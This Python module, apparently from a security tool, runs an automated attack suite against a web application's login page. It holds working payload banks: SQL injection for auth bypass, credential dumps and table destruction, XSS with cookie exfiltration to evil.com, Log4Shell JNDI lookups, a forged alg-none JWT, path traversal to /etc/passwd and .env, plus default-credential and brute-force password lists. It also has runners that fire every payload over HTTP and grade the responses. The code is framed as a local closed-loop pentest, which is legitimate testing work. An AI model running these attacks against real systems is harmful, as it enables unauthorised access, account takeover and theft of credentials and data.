"""
AI-DTCTM | Login Page Attack Suite
════════════════════════════════════════════════════════════════════════
Real HTTP attacks against a running clone's login page.
All 6 attack categories × 30 payloads = 180 total probes.

Each attack hits the live Docker container on localhost — the app is
isolated (no internet) so this is a safe closed-loop pentest.

VERDICT LOGIC:
  CRITICAL  → direct auth bypass / RCE / data leak proven
  HIGH      → reflected injection / no rate-limit / no CSRF
  MEDIUM    → information disclosure / config weakness
  SECURED   → attack blocked, input sanitised, proper response

SCORE:
  100 → 80  SECURED   (green)
   79 → 50  MODERATE  (amber)
   49 →  0  VULNERABLE (red)
"""
from __future__ import annotations

import re
import time
from typing import Iterator

try:
    import requests
    _REQ = True
except ImportError:
    _REQ = False


# ═══════════════════════════════════════════════════════════════════════
#  PAYLOAD BANKS  — 30 entries per category, each with a short "what"
# ═══════════════════════════════════════════════════════════════════════

SQLI_PAYLOADS: list[dict] = [
    # ── Boolean / auth-bypass ──────────────────────────────────────
    {"payload": "' OR '1'='1",          "what": "Classic boolean true — makes WHERE always true"},
    {"payload": "' OR 1=1--",           "what": "Numeric boolean + comment out rest of query"},
    {"payload": "admin'--",             "what": "Comment out password check, log in as admin"},
    {"payload": "' OR ''='",            "what": "Empty-string equality bypass"},
    {"payload": "' OR 'x'='x",         "what": "String equality always true"},
    {"payload": "1' OR '1'='1'--",     "what": "Numeric user id + boolean bypass"},
    {"payload": "' OR 1=1#",           "what": "MySQL hash-comment bypass"},
    {"payload": "') OR ('1'='1",       "what": "Parenthesis-wrapped boolean bypass"},
    {"payload": "' OR 'unusual'='unusual'--", "what": "Non-obvious string equality bypass"},
    {"payload": "1 OR 1=1",            "what": "No-quote numeric injection (integer fields)"},
    # ── Comment variants ──────────────────────────────────────────
    {"payload": "admin'/*",            "what": "Block-comment truncates password condition"},
    {"payload": "' OR 1=1/*",         "what": "Block-comment + boolean bypass"},
    {"payload": "';--",               "what": "Statement terminator + comment"},
    {"payload": "' ;--",              "what": "Space before semicolon evasion"},
    # ── UNION-based data extraction ────────────────────────────────
    {"payload": "' UNION SELECT 1,2,3--",             "what": "Column count enumeration probe"},
    {"payload": "' UNION SELECT NULL,NULL,NULL--",    "what": "Null-based column count probe"},
    {"payload": "' UNION SELECT username,password,3 FROM users--", "what": "Direct credential dump from users table"},
    {"payload": "' UNION SELECT table_name,2,3 FROM information_schema.tables--", "what": "List all database tables"},
    {"payload": "' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--", "what": "Enumerate columns of users table"},
    {"payload": "' UNION SELECT name,sql,3 FROM sqlite_master--", "what": "SQLite schema dump (table names + CREATE SQL)"},
    # ── Stacked / destructive ─────────────────────────────────────
    {"payload": "'; DROP TABLE users--",              "what": "Attempt to destroy users table (stacked query)"},
    {"payload": "'; INSERT INTO users VALUES('hacker','hacked','admin')--", "what": "Inject a new admin user"},
    {"payload": "'; UPDATE users SET password='hacked' WHERE '1'='1'--", "what": "Mass-reset all passwords"},
    {"payload": "'; DELETE FROM audit_log--",         "what": "Wipe audit/log table (cover tracks)"},
    # ── Blind / time-based ────────────────────────────────────────
    {"payload": "' AND SLEEP(5)--",                  "what": "MySQL time-based blind — 5 s delay = injectable"},
    {"payload": "'; SELECT pg_sleep(5)--",           "what": "PostgreSQL time-based blind injection"},
    {"payload": "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--", "what": "MSSQL error-based schema extraction"},
    {"payload": "' AND (SELECT SUBSTR(password,1,1) FROM users LIMIT 1)='a'--", "what": "Blind char-by-char password extraction"},
    # ── Encoding / evasion ────────────────────────────────────────
    {"payload": "%27 OR %271%27=%271",               "what": "URL-encoded quote evasion"},
    {"payload": "' /*!OR*/ '1'='1",                 "what": "MySQL inline-comment evasion of WAF"},
]

XSS_PAYLOADS: list[dict] = [
    {"payload": "<script>alert('XSS')</script>",           "what": "Classic script-tag XSS"},
    {"payload": "<script>alert(document.cookie)</script>", "what": "Cookie theft via XSS"},
    {"payload": "<img src=x onerror=alert(1)>",            "what": "Image onerror event handler"},
    {"payload": "<svg onload=alert(1)>",                    "what": "SVG onload XSS — bypasses script filters"},
    {"payload": "'\"><script>alert(1)</script>",           "what": "Break out of attribute + inject script"},
    {"payload": "<body onload=alert(1)>",                   "what": "Body-tag event XSS"},
    {"payload": "javascript:alert(1)",                      "what": "JavaScript URI in href/src"},
    {"payload": "<iframe src=javascript:alert(1)>",        "what": "Iframe javascript: URI"},
    {"payload": "<input autofocus onfocus=alert(1)>",      "what": "Auto-focus input triggers without click"},
    {"payload": "<details open ontoggle=alert(1)>",        "what": "HTML5 details-tag event XSS"},
    {"payload": "<video><source onerror=alert(1)>",        "what": "Video source error event"},
    {"payload": "';alert(String.fromCharCode(88,83,83))//", "what": "Char-code obfuscation evasion"},
    {"payload": "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoMSk='))\">", "what": "Base64-encoded payload evasion"},
    {"payload": "<math><mtext></table><img src=1 onerror=alert(1)>", "what": "MathML namespace confusion XSS"},
    {"payload": "<script>fetch('http://evil.com?c='+document.cookie)</script>", "what": "Actual cookie exfiltration to remote server"},
    {"payload": "<<script>alert('XSS');//<</script>",     "what": "Double open-tag filter bypass"},
    {"payload": "<scr\x00ipt>alert(1)</scr\x00ipt>",      "what": "Null-byte injection to bypass filters"},
    {"payload": "<a href=j&#97;v&#97;script:alert(1)>",   "what": "HTML entity encoding bypass"},
    {"payload": "<img src=1 onerror=&#97;&#108;&#101;&#114;&#116;(1)>", "what": "Entity-encoded event handler bypass"},
    {"payload": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", "what": "Unicode escape bypass for JSON injection"},
    {"payload": "<script>new Image().src='http://a.com/?x='+document.cookie</script>", "what": "Cookie exfil via image beacon"},
    {"payload": "<marquee onstart=alert(1)>",              "what": "Marquee start event (IE/older browsers)"},
    {"payload": "<isindex action=javascript:alert(1) type=image>", "what": "isindex element XSS (legacy)"},
    {"payload": "\"onmouseover=\"alert(1)\"",              "what": "Attribute breakout via double-quote"},
    {"payload": "';alert(1);//",                           "what": "JS context breakout"},
    {"payload": "<form action=javascript:alert(1)>",       "what": "Form action javascript URI"},
    {"payload": "<object data=javascript:alert(1)>",       "what": "Object element javascript URI"},
    {"payload": "<embed src=javascript:alert(1)>",         "what": "Embed element javascript URI"},
    {"payload": "<button onfocus=alert(1) autofocus>",     "what": "Button auto-focus XSS"},
    {"payload": "<textarea autofocus onfocus=alert(1)>",   "what": "Textarea focus XSS"},
]

DEFAULT_CREDS: list[dict] = [
    {"username": "admin",        "password": "admin",        "what": "Most common default — admin/admin"},
    {"username": "admin",        "password": "password",     "what": "admin + dictionary word"},
    {"username": "admin",        "password": "123456",       "what": "admin + weakest numeric password"},
    {"username": "admin",        "password": "admin123",     "what": "admin + number suffix"},
    {"username": "root",         "password": "root",         "what": "Database/system root credentials"},
    {"username": "root",         "password": "password",     "what": "root + common password"},
    {"username": "root",         "password": "toor",         "what": "root reversed — classic default"},
    {"username": "administrator","password": "administrator", "what": "Windows-style full word admin"},
    {"username": "administrator","password": "password",     "what": "Windows admin + weak password"},
    {"username": "test",         "password": "test",         "what": "Dev/test account left in production"},
    {"username": "guest",        "password": "guest",        "what": "Guest account with default password"},
    {"username": "user",         "password": "user",         "what": "Generic user account"},
    {"username": "demo",         "password": "demo",         "what": "Demo account — often forgotten"},
    {"username": "sa",           "password": "",             "what": "SQL Server sa account with blank password"},
    {"username": "sa",           "password": "sa",           "what": "SQL Server sa + matching password"},
    {"username": "admin",        "password": "",             "what": "admin with blank password"},
    {"username": "admin",        "password": "1234",         "what": "admin + 4-digit PIN"},
    {"username": "admin",        "password": "12345",        "what": "admin + 5-digit sequence"},
    {"username": "admin",        "password": "qwerty",       "what": "admin + keyboard-row password"},
    {"username": "admin",        "password": "letmein",      "what": "admin + social-engineering phrase"},
    {"username": "admin",        "password": "welcome",      "what": "admin + common welcome phrase"},
    {"username": "admin",        "password": "changeme",     "what": "admin + placeholder never changed"},
    {"username": "admin",        "password": "pass",         "what": "admin + shortest common word"},
    {"username": "superuser",    "password": "superuser",    "what": "Django default superuser"},
    {"username": "webmaster",    "password": "webmaster",    "what": "CMS webmaster default"},
    {"username": "manager",      "password": "manager",      "what": "Management account default"},
    {"username": "operator",     "password": "operator",     "what": "Operator-level default"},
    {"username": "support",      "password": "support",      "what": "Support account default"},
    {"username": "info",         "password": "info",         "what": "Info/contact account default"},
    {"username": "admin",        "password": "P@ssw0rd",     "what": "Complexity-requirement trivial substitution"},
]

BRUTE_FORCE_PAYLOADS: list[dict] = [
    {"password": "123456",    "what": "#1 most common password globally (2024 breach data)"},
    {"password": "password",  "what": "#2 most common — literal word 'password'"},
    {"password": "12345678",  "what": "8-char numeric sequence"},
    {"password": "qwerty",    "what": "Top keyboard row sequence"},
    {"password": "abc123",    "what": "Simple alpha+numeric combo"},
    {"password": "monkey",    "what": "Perennially common single-word password"},
    {"password": "1234567",   "what": "7-digit ascending sequence"},
    {"password": "letmein",   "what": "Social-engineering phrase"},
    {"password": "trustno1",  "what": "X-Files reference — top 20 password lists"},
    {"password": "dragon",    "what": "Popular single-word password"},
    {"password": "master",    "what": "Power-association single word"},
    {"password": "iloveyou",  "what": "Emotional single-phrase password"},
    {"password": "sunshine",  "what": "Positive single-word password"},
    {"password": "princess",  "what": "Common feminine single-word"},
    {"password": "shadow",    "what": "Edgy single-word — top breach lists"},
    {"password": "superman",  "what": "Pop-culture single-word"},
    {"password": "michael",   "what": "Most common first-name password (EN)"},
    {"password": "jessica",   "what": "#2 most common first-name password (EN)"},
    {"password": "password1", "what": "password + complexity suffix attempt"},
    {"password": "password123","what": "password + 3-digit suffix — fails most complexity checks"},
    {"password": "P@ssw0rd",  "what": "Trivial leet substitution — passes complexity, still weak"},
    {"password": "qwerty123", "what": "Keyboard row + digits"},
    {"password": "football",  "what": "Sport single-word — high in breach dumps"},
    {"password": "baseball",  "what": "Sport single-word"},
    {"password": "welcome",   "what": "Corporate onboarding default"},
    {"password": "login",     "what": "Context-aware weak password"},
    {"password": "pass",      "what": "Shortest obvious word"},
    {"password": "test",      "what": "Dev-mode placeholder left in prod"},
    {"password": "admin",     "what": "Username-as-password (credential stuffing target)"},
    {"password": "000000",    "what": "6-zero PIN — frequent in mobile apps"},
    # ── Admin-specific defaults (high-value targets) ──────────────
    {"password": "admin123",  "what": "admin + 3-digit suffix — #1 admin default worldwide"},
    {"password": "admin1234", "what": "admin + 4-digit suffix"},
    {"password": "admin@123", "what": "admin + special + digits — common IT policy bypass"},
    {"password": "Admin123",  "what": "Capitalised admin123 — common complexity-rule bypass"},
    {"password": "root123",   "what": "root + 3-digit suffix — server default"},
    {"password": "toor",      "what": "root reversed — Kali Linux default"},
    {"password": "changeme",  "what": "Placeholder default — often never changed"},
    {"password": "1q2w3e4r",  "what": "Keyboard diagonal pattern — common in SE Asia"},
    {"password": "qwerty",    "what": "Keyboard row (duplicate catch for rotated lists)"},
]

HEADER_PAYLOADS: list[dict] = [
    {"header": "X-Forwarded-For",  "value": "127.0.0.1",           "what": "Spoof localhost IP — bypasses IP-based rate limits"},
    {"header": "X-Forwarded-For",  "value": "0.0.0.0",             "what": "Null-route IP spoof — some apps allow 0.0.0.0 as admin IP"},
    {"header": "X-Real-IP",        "value": "127.0.0.1",           "what": "Nginx proxy header spoof — whitelist bypass"},
    {"header": "X-Originating-IP", "value": "127.0.0.1",           "what": "Outlook Web App proxy header IP spoof"},
    {"header": "Client-IP",        "value": "127.0.0.1",           "what": "Akamai/CDN client IP header spoof"},
    {"header": "X-Custom-IP-Authorization", "value": "127.0.0.1",  "what": "Laravel/Symfony internal header IP bypass"},
    {"header": "User-Agent",       "value": "' OR 1=1--",          "what": "SQLi in User-Agent (logged to DB without sanitisation)"},
    {"header": "User-Agent",       "value": "<script>alert(1)</script>", "what": "XSS in User-Agent shown in admin log viewer"},
    {"header": "Referer",          "value": "' OR 1=1--",          "what": "SQLi in Referer header — often logged raw"},
    {"header": "Cookie",           "value": "session=admin; role=admin", "what": "Cookie tampering — role escalation via plain-text cookie"},
    {"header": "X-HTTP-Method-Override", "value": "DELETE",        "what": "Method override — bypass firewall blocking DELETE requests"},
    {"header": "Content-Type",     "value": "application/json",    "what": "Content-type switch — may trigger different parser (JSON injection)"},
    {"header": "X-Api-Version",    "value": "' UNION SELECT 1--",  "what": "SQLi in version header — logged to DB"},
    {"header": "Authorization",    "value": "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.", "what": "JWT 'none' algorithm attack — forged admin token"},
    {"header": "X-Forwarded-Host", "value": "evil.com",            "what": "Host header injection — password-reset link poisoning"},
    {"header": "Host",             "value": "evil.com",            "what": "Direct Host header poison — cache poisoning"},
    {"header": "X-CSRF-Token",     "value": "invalid_token_12345", "what": "Invalid CSRF token — does server reject or allow?"},
    {"header": "Accept-Language",  "value": "en' OR '1'='1",       "what": "SQLi in Accept-Language (rare but seen in i18n code)"},
    {"header": "X-Forwarded-Proto","value": "https",               "what": "Protocol spoof — may bypass HTTP→HTTPS redirect"},
    {"header": "X-Debug",          "value": "true",                "what": "Debug mode trigger — some frameworks expose stack traces"},
    {"header": "X-Requested-With", "value": "XMLHttpRequest",      "what": "Ajax spoof — bypass CSRF checks that only apply to XHR"},
    {"header": "Origin",           "value": "http://evil.com",     "what": "CORS origin probe — does server echo Origin back with Allow-*?"},
    {"header": "Access-Control-Request-Method", "value": "POST",   "what": "CORS preflight — check wildcard or overly-permissive CORS"},
    {"header": "X-Frame-Options",  "value": "ALLOWALL",            "what": "Client-sent frame option — does server honour client header?"},
    {"header": "${jndi:ldap://evil.com/a}", "value": "1",          "what": "Log4Shell (CVE-2021-44228) — RCE via JNDI injection in any header"},
    {"header": "User-Agent",       "value": "${jndi:ldap://evil.com/a}", "what": "Log4Shell in User-Agent (most common Log4j attack vector)"},
    {"header": "X-Api-Key",        "value": "../../../../etc/passwd", "what": "Path traversal via API key header"},
    {"header": "Transfer-Encoding","value": "chunked",             "what": "TE.CL HTTP request smuggling probe"},
    {"header": "Content-Length",   "value": "0",                   "what": "Zero content-length with body — CL.TE smuggling probe"},
    {"header": "X-Forwarded-For",  "value": "' OR SLEEP(5)--",    "what": "Time-based SQLi via IP header (logged to DB)"},
]

CSRF_CHECKS: list[dict] = [
    {"what": "POST without CSRF token",          "probe": "no_token"},
    {"what": "Empty CSRF token value",           "probe": "empty_token"},
    {"what": "Reused old CSRF token",            "probe": "old_token"},
    {"what": "Random garbage CSRF token",        "probe": "garbage_token"},
    {"what": "Cross-origin POST (Origin: evil)", "probe": "cross_origin"},
    {"what": "GET request for state-change",     "probe": "get_mutate"},
]

PATH_TRAVERSAL: list[dict] = [
    {"payload": "../../../etc/passwd",                      "what": "Unix password file — proves path traversal works"},
    {"payload": "..%2F..%2F..%2Fetc%2Fpasswd",            "what": "URL-encoded traversal — bypasses naive '../' filter"},
    {"payload": "....//....//etc/passwd",                   "what": "Double-dot filter bypass (filtered '../' → '../')"},
    {"payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","what": "Double-encoded traversal"},
    {"payload": "..\\..\\..\\windows\\win.ini",            "what": "Windows path traversal (backslash)"},
    {"payload": "../../../var/log/apache2/access.log",     "what": "Apache access log — may contain injectable data"},
    {"payload": "../../../proc/self/environ",              "what": "Linux process environment — leaks secrets/env vars"},
    {"payload": "../../../app/config/database.yml",        "what": "Rails DB config — credentials"},
    {"payload": "../../../.env",                           "what": ".env file — API keys, DB passwords"},
    {"payload": "../../../config/config.php",              "what": "PHP config — DB credentials"},
]


# ═══════════════════════════════════════════════════════════════════════
#  LOGIN ENDPOINT DISCOVERY
# ═══════════════════════════════════════════════════════════════════════

_LOGIN_PATHS = [
    "/login", "/signin", "/auth", "/login.php", "/signin.php",
    "/auth/login", "/user/login", "/admin/login", "/account/login",
    "/api/login", "/api/auth", "/api/signin", "/api/v1/login",
    "/users/sign_in", "/session/new", "/sessions",
]

_LOGIN_FIELD_COMBOS = [
    ("username", "password"),
    ("email",    "password"),
    ("user",     "pass"),
    ("login",    "password"),
    ("userid",   "passwd"),
    ("email",    "passwd"),
    ("uname",    "pwd"),
    ("username", "passwd"),
]


def discover_login_endpoint(base_url: str, timeout: int = 5) -> dict | None:
    """
    Probe common login paths, return first found:
    {"url": full_url, "fields": (user_field, pass_field), "method": "POST"}
    Returns None if no login page found.
    """
    if not _REQ:
        return None
    base = base_url.rstrip("/")
    for path in _LOGIN_PATHS:
        try:
            r = requests.get(base + path, timeout=timeout, allow_redirects=True)
            if r.status_code == 200:
                body = r.text.lower()
                if any(k in body for k in ("password", "passwd", "login", "sign in", "signin")):
                    # Guess field names from form HTML
                    fields = _guess_fields(r.text)
                    return {
                        "url":    base + path,
                        "fields": fields or ("username", "password"),
                        "method": "POST",
                        "found_path": path,
                    }
        except Exception:
            continue
    return None


def _guess_fields(html: str) -> tuple[str, str] | None:
    """Extract (user_field, pass_field) from login form HTML."""
    pass_m = re.search(
        r'<input[^>]+type=["\']password["\'][^>]*name=["\']([^"\']+)["\']'
        r'|<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\']password["\']',
        html, re.I
    )
    pass_field = (pass_m.group(1) or pass_m.group(2)) if pass_m else "password"

    text_m = re.search(
        r'<input[^>]+type=["\'](?:text|email)["\'][^>]*name=["\']([^"\']+)["\']'
        r'|<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\'](?:text|email)["\']',
        html, re.I
    )
    user_field = (text_m.group(1) or text_m.group(2)) if text_m else "username"
    return (user_field, pass_field)


# ═══════════════════════════════════════════════════════════════════════
#  ATTACK RUNNER
# ═══════════════════════════════════════════════════════════════════════

def _is_success(resp: requests.Response, original_body: str) -> bool:
    """Heuristic: did the login succeed?"""
    body = resp.text.lower()
    code = resp.status_code
    # Success indicators
    if code in (200, 302) and any(k in body for k in (
        "dashboard", "welcome", "logout", "sign out", "profile",
        "home", "you are logged", "success", "token",
    )):
        return True
    # Redirect after login = usually success
    if code == 302 and "login" not in resp.headers.get("Location", "").lower():
        return True
    return False


def _is_reflected(resp: requests.Response, payload: str) -> bool:
    """Check if raw payload appears unescaped in the response."""
    critical = ["<script>", "onerror=", "onload=", "javascript:", "alert("]
    body = resp.text
    return any(c in body for c in critical)


def _http_post(url: str, data: dict, headers: dict | None = None, timeout: int = 6):
    try:
        return requests.post(url, data=data,
                             headers=headers or {}, timeout=timeout,
                             allow_redirects=True)
    except Exception as exc:
        return None


def _evt(kind: str, payload: str, what: str, verdict: str,
         color: str, detail: str, status_code: int | None = None) -> dict:
    return {
        "kind": kind, "payload": payload, "what": what,
        "verdict": verdict, "color": color, "detail": detail,
        "status_code": status_code, "ts": time.time(),
    }


def run_sqli_attacks(endpoint: dict) -> Iterator[dict]:
    url    = endpoint["url"]
    uf, pf = endpoint["fields"]
    # Fetch baseline (failed login) to compare
    baseline = _http_post(url, {uf: "normaluser", pf: "wrongpassword"})
    if baseline is None:
        yield _evt("sqli", "PRE-CHECK", "Baseline", "TIMEOUT", "#94A3B8",
                   f"Cannot reach {url}", None)
        return
    # Abort early if endpoint returns 404 consistently
    if baseline.status_code == 404:
        yield _evt("sqli", "ENDPOINT CHECK", "Login route",
                   "INFO", "#0284C7",
                   f"HTTP 404 — no login form at {url}\n"
                   "SQLi not applicable. Switch to a real login endpoint.",
                   404)
        return
    baseline_body = baseline.text

    for item in SQLI_PAYLOADS:
        pl, what = item["payload"], item["what"]
        resp = _http_post(url, {uf: pl, pf: "x"})
        if resp is None:
            yield _evt("sqli", pl, what, "TIMEOUT", "#94A3B8", "No response", None)
            continue

        if _is_success(resp, baseline_body):
            yield _evt("sqli", pl, what, "CRITICAL", "#DC2626",
                       f"AUTH BYPASS — server returned HTTP {resp.status_code}. "
                       "Login succeeded with injected payload.",
                       resp.status_code)
        elif resp.status_code == 500:
            yield _evt("sqli", pl, what, "HIGH", "#EA580C",
                       f"SQL ERROR leaked (HTTP 500) — raw DB error visible to attacker. "
                       f"Snippet: {resp.text[:80]}",
                       resp.status_code)
        elif any(e in resp.text.lower() for e in (
            "sql", "sqlite", "mysql", "syntax error", "unclosed quotation",
            "ora-", "pg::", "jdbc",
        )):
            yield _evt("sqli", pl, what, "HIGH", "#EA580C",
                       f"DB error string in response — confirms injection point",
                       resp.status_code)
        else:
            yield _evt("sqli", pl, what, "SECURED", "#16A34A",
                       f"HTTP {resp.status_code} — attack blocked / sanitised",
                       resp.status_code)
        time.sleep(0.05)


def run_xss_attacks(endpoint: dict) -> Iterator[dict]:
    url    = endpoint["url"]
    uf, pf = endpoint["fields"]
    baseline = _http_post(url, {uf: "probe", pf: "probe"})
    if baseline and baseline.status_code == 404:
        yield _evt("xss", "ENDPOINT CHECK", "Login route",
                   "INFO", "#0284C7",
                   f"HTTP 404 — no login form at {url}. XSS not applicable.", 404)
        return

    for item in XSS_PAYLOADS:
        pl, what = item["payload"], item["what"]
        resp = _http_post(url, {uf: pl, pf: "x"})
        if resp is None:
            yield _evt("xss", pl, what, "TIMEOUT", "#94A3B8", "No response", None)
            continue

        if _is_reflected(resp, pl):
            yield _evt("xss", pl, what, "HIGH", "#EA580C",
                       f"REFLECTED — raw payload in response body. "
                       "Unescaped input renders as live HTML/JS.",
                       resp.status_code)
        else:
            yield _evt("xss", pl, what, "SECURED", "#16A34A",
                       f"HTTP {resp.status_code} — payload escaped / not reflected",
                       resp.status_code)
        time.sleep(0.05)


def run_default_creds(endpoint: dict) -> Iterator[dict]:
    url    = endpoint["url"]
    uf, pf = endpoint["fields"]
    baseline = _http_post(url, {uf: "normaluser", pf: "wrongpassword"})
    baseline_body = baseline.text if baseline else ""

    for item in DEFAULT_CREDS:
        usr, pwd, what = item["username"], item["password"], item["what"]
        resp = _http_post(url, {uf: usr, pf: pwd})
        if resp is None:
            yield _evt("creds", f"{usr}:{pwd}", what, "TIMEOUT", "#94A3B8", "No response", None)
            continue

        if _is_success(resp, baseline_body):
            yield _evt("creds", f"{usr}:{pwd}", what, "CRITICAL", "#DC2626",
                       f"DEFAULT CREDENTIALS ACCEPTED — logged in as `{usr}` "
                       "with this default password. Immediate account takeover possible.",
                       resp.status_code)
        else:
            yield _evt("creds", f"{usr}:{pwd}", what, "SECURED", "#16A34A",
                       f"HTTP {resp.status_code} — credentials rejected",
                       resp.status_code)
        time.sleep(0.08)


def run_brute_force(endpoint: dict, username: str = "admin") -> Iterator[dict]:
    url    = endpoint["url"]
    uf, pf = endpoint["fields"]

    # ── Pre-flight: probe baseline to detect 404 (endpoint missing) ──
    baseline = _http_post(url, {uf: "normaluser", pf: "wrongpassword"})
    if baseline is None:
        yield _evt("brute", "PRE-CHECK", "Baseline probe",
                   "TIMEOUT", "#94A3B8", f"Cannot reach {url} — check container is running", None)
        return
    baseline_body = baseline.text

    # 404 at baseline = endpoint doesn't exist at all
    if baseline.status_code == 404:
        yield _evt("brute", "ENDPOINT CHECK", "Login route probe",
                   "INFO", "#0284C7",
                   f"HTTP 404 — no login form at {url}\n"
                   "Brute force is not applicable here. The /login route does not exist.\n"
                   "Tip: switch to http://localhost:8102/login (Vulnerable Demo) "
                   "or select a container with a login endpoint.",
                   404)
        return

    # 404-like: every request hits 404 → wrong endpoint
    lock_detected  = False
    cracked        = False
    all_404        = True
    attempts_done  = 0

    for i, item in enumerate(BRUTE_FORCE_PAYLOADS):
        pwd, what = item["password"], item["what"]
        if lock_detected or cracked:
            yield _evt("brute", pwd, what, "SECURED", "#16A34A",
                       "Skipped — attack stopped (locked/cracked)", None)
            continue

        resp = _http_post(url, {uf: username, pf: pwd})
        attempts_done += 1
        if resp is None:
            yield _evt("brute", pwd, what, "TIMEOUT", "#94A3B8", "No response", None)
            continue

        sc = resp.status_code
        if sc != 404:
            all_404 = False

        # ── Verdicts ─────────────────────────────────────────────────
        if sc == 404:
            # Endpoint still not found during brute — skip silently
            yield _evt("brute", pwd, what, "INFO", "#0284C7",
                       f"HTTP 404 — endpoint not found (attempt #{i+1})", sc)

        elif sc == 429:
            lock_detected = True
            yield _evt("brute", pwd, what, "SECURED", "#16A34A",
                       f"✅ Rate-limit triggered at attempt #{i+1} — HTTP 429. "
                       "Brute force protection IS working!", sc)

        elif sc == 403 and "lock" in resp.text.lower():
            lock_detected = True
            yield _evt("brute", pwd, what, "SECURED", "#16A34A",
                       f"✅ Account locked at attempt #{i+1}. Brute force protection active.", sc)

        elif _is_success(resp, baseline_body):
            cracked = True
            # _http_post follows redirects — sc=200 means we landed on dashboard
            _loc = resp.headers.get("Location","")
            _detail = (f"CRACKED — {username}:{pwd} → Logged in! "
                       f"(HTTP {sc} — server accepted these credentials)\n"
                       f"{'Redirected to: ' + _loc if _loc else 'Dashboard/welcome page loaded'}\n"
                       "Run credential extractor to dump full DB now.")
            yield _evt("brute", pwd, what, "CRITICAL", "#DC2626", _detail, sc)

        elif sc == 200:
            # Wrong password but endpoint exists and is responding = real brute force target
            yield _evt("brute", pwd, what,
                       "HIGH" if i >= 10 else "MEDIUM",
                       "#EA580C" if i >= 10 else "#D97706",
                       f"Wrong password (attempt #{i+1}) — "
                       f"no lockout after {i+1} attempt{'s' if i else ''}", sc)
        else:
            yield _evt("brute", pwd, what, "INFO", "#0284C7",
                       f"HTTP {sc} — unexpected response at attempt #{i+1}", sc)

        time.sleep(0.08)

    # ── Final summary ─────────────────────────────────────────────────
    if all_404:
        yield _evt("brute", "SUMMARY", "Endpoint check",
                   "INFO", "#0284C7",
                   "All attempts returned HTTP 404 — this URL has no login endpoint.\n"
                   "Brute force NOT applicable. Switch target to a real login form.", None)
    elif cracked:
        yield _evt("brute", "SUMMARY", "Result",
                   "CRITICAL", "#DC2626",
                   f"PASSWORD CRACKED in {attempts_done} attempts. "
                   "No rate limiting. App fully compromised.", None)
    elif lock_detected:
        yield _evt("brute", "SUMMARY", "Result",
                   "SECURED", "#16A34A",
                   "Brute force was blocked. Rate-limiting/lockout IS protecting this app.", None)
    else:
        yield _evt("brute", "SUMMARY", "Rate-limit check",
                   "HIGH", "#EA580C",
                   f"Completed {attempts_done} attempts with NO lockout detected. "
                   "App has NO brute-force protection — vulnerable to credential stuffing.", None)


def run_header_attacks(base_url: str, endpoint: dict) -> Iterator[dict]:
    url = endpoint["url"]
    for item in HEADER_PAYLOADS:
        h, v, what = item["header"], item["value"], item["what"]
        try:
            resp = requests.post(url, data={}, headers={h: v},
                                 timeout=6, allow_redirects=True)
            body = resp.text.lower()

            if resp.status_code == 200 and "dashboard" in body:
                verdict, color = "CRITICAL", "#DC2626"
                detail = f"Header `{h}: {v}` caused AUTH BYPASS (HTTP 200 + dashboard)"
            elif "${jndi" in v and resp.elapsed.total_seconds() > 2:
                verdict, color = "CRITICAL", "#DC2626"
                detail = f"Log4Shell delay detected — server may be resolving JNDI!"
            elif v in resp.text:
                verdict, color = "MEDIUM", "#D97706"
                detail = f"Header value reflected in response — possible injection point"
            elif resp.status_code == 403:
                verdict, color = "SECURED", "#16A34A"
                detail = f"HTTP 403 — header blocked by security middleware"
            else:
                verdict, color = "INFO", "#0284C7"
                detail = f"HTTP {resp.status_code} — no obvious reaction"

            yield _evt("header", f"{h}: {v}", what, verdict, color, detail, resp.status_code)
        except Exception as exc:
            yield _evt("header", f"{h}: {v}", what, "TIMEOUT", "#94A3B8", str(exc)[:60], None)
        time.sleep(0.05)


def run_path_traversal(base_url: str) -> Iterator[dict]:
    base = base_url.rstrip("/")
    # Try common file-serving endpoints
    for path_param in ["/file?path=", "/download?file=", "/static/", "/assets/", "/"]:
        for item in PATH_TRAVERSAL:
            pl, what = item["payload"], item["what"]
            url = base + path_param + pl
            try:
                resp = requests.get(url, timeout=5, allow_redirects=True)
                if resp.status_code == 200 and any(k in resp.text for k in (
                    "root:", "/bin/", "[boot loader]", "DB_PASSWORD", "SECRET_KEY",
                )):
                    yield _evt("traversal", pl, what, "CRITICAL", "#DC2626",
                               f"FILE LEAK at {url} — sensitive file contents in response. "
                               f"Snippet: {resp.text[:100]}",
                               resp.status_code)
                elif resp.status_code == 200:
                    yield _evt("traversal", pl, what, "MEDIUM", "#D97706",
                               f"HTTP 200 at {url} — path accepted (verify content manually)",
                               resp.status_code)
                else:
                    yield _evt("traversal", pl, what, "SECURED", "#16A34A",
                               f"HTTP {resp.status_code} — path rejected",
                               resp.status_code)
                time.sleep(0.04)
            except Exception:
                continue
        break   # Only try first matching path_param for speed


# ═══════════════════════════════════════════════════════════════════════
#  SCORING
# ═══════════════════════════════════════════════════════════════════════

_DEDUCT = {"CRITICAL": 25, "HIGH": 12, "MEDIUM": 5, "INFO": 0, "SECURED": 0, "TIMEOUT": 0}


def score_results(events: list[dict]) -> dict:
    score = 100
    breakdown: dict[str, int] = {}
    for ev in events:
        v = ev.get("verdict", "INFO")
        d = _DEDUCT.get(v, 0)
        score -= d
        breakdown[v] = breakdown.get(v, 0) + 1
    score = max(0, score)

    if score >= 80:
        label, color = "SECURED",    "#16A34A"
    elif score >= 50:
        label, color = "MODERATE",   "#D97706"
    else:
        label, color = "VULNERABLE", "#DC2626"

    return {"score": score, "label": label, "color": color, "breakdown": breakdown}
